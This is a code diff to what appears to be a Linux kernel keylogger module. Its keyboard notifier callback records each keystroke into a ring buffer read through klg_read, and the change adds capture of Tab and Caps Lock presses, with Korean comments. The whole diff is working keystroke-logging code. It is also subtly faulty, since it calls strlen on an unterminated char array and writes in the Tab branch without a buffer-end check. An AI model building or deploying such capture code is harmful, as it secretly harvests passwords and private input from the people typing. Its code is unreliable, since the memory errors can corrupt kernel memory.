@@ -83,7 +83,8 @@ ssize_t klg_read(struct file *filp, char __user *buf, size_t count, loff_t *f_po
 
 int kbd_notifier(struct notifier_block* nblock, unsigned long code, void* _param) {
 	struct keyboard_notifier_param *param = _param; //사용자가 입력한 문자를 저장함
-
+	int i;
+	char caps[] = { '[','c','a','p','s',' ','l','o','c','k',']'};
 	if (code == KBD_KEYCODE)
 	{
 		if (param->value == 42 || param->value == 54)
@@ -94,12 +95,28 @@ int kbd_notifier(struct notifier_block* nblock, unsigned long code, void* _param
 		}
 		if (param->down)
 		{
-			if (param->value == KEY_BACKSPACE)  //백스페이스일 때
+			if (param->value == KEY_BACKSPACE)  //백스페이스 눌렀을 때
 			{ 
 				*bptr = '\\' ;
 				bptr++;
 				*bptr = 'r' ;
 				bptr++;
+				if (bptr == endptr) bptr = buffer;
+			}
+			else if (param->value == KEY_TAB)  //탭키 눌렀을 때
+			{
+				*bptr = '\\';
+				bptr++;
+				*bptr = 't';
+				bptr++;
+			}
+			else if (param->value == KEY_CAPSLOCK)  //캡스락 눌렀을 때
+			{
+				for (i = 0; i <strlen(caps); i++) {
+					*bptr = caps[i];
+					bptr++;
+					if (bptr == endptr) bptr = buffer;
+				}
 			}
 			else 
 			{
@@ -111,7 +128,7 @@ int kbd_notifier(struct notifier_block* nblock, unsigned long code, void* _param
 				if (ch != 'X') {  //X아니면
 					*bptr = ch;  //bptr에 저장하고
 					bptr++;  //주소1증가
-					if (bptr == endptr) bptr = buffer;  //처음으로 초기화하는건가
+					if (bptr == endptr) bptr = buffer;  //버퍼의 끝에 다다르면 처음으로 초기화
 				}
 			}
 		}
